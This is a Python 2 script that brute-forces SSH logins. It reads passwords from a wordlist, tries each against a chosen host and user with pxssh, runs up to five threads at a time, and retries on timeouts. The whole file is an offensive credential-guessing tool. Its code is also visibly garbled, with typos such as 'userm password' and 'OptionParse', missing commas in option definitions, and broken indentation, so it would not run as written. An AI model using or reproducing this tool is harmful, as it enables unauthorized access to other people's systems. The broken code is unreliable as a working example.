import pexpect
import pxssh
import optparse
import time
from threading import *


MAX_CONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTIONS)
FOUND = False
FAILS = 0


def connect(host, user, password, release):
	global FOUND
	global FAILS
	try:
		s = pxssh.pxssh()
		s.login(host, userm password)
		print '[+] Password found: ' + password
	FOUND = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
		FAILS += 1
			time.sleep(5)
			connect(host, user, password, False)
	elif 'synchronize with original prompt' in str(e):
		time.sleep(1)
		connect(host, user, password, False)
	finally:
	if release: CONNECTION_LOCK.release()


def main():
	parser = optparse.OptionParse('usage%prog '+\
		'-H <target host> -u <user> -F <password list>')
	parser.add_option('-H', dest='tgtHost', type='string', \
		help='Specify target host')
	parser.add_option('-F', dest='passwdFile', type='string' \
		help='Specify password file')
	parser.add_option('-u', dest='user', type='string' \
		help='Specify the user')
	(options, args) = parser.parse_args()
	host = options.tgtHost
	passwdFile = options.passwdFile
	user = options.user
	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)
	fn = open(passwdFile, 'r')
	for line in fn.readlines():
		if FOUND:
			print "[*] Exiting: Password Found"
			exit(0)
			if FAILS > 5:
			print "[!] Exiiting: Too many socket timeouts"
			exit(0)
		CONNECTION_LOCK.acquire()
			password = line.strip('\r').strip('\n')
		print "[*] Testing: " + str(password)
			t = Thread(target=connect, args=(host, user, password, True))
		child = t.start()

if __name__ == '__main__':
	main()
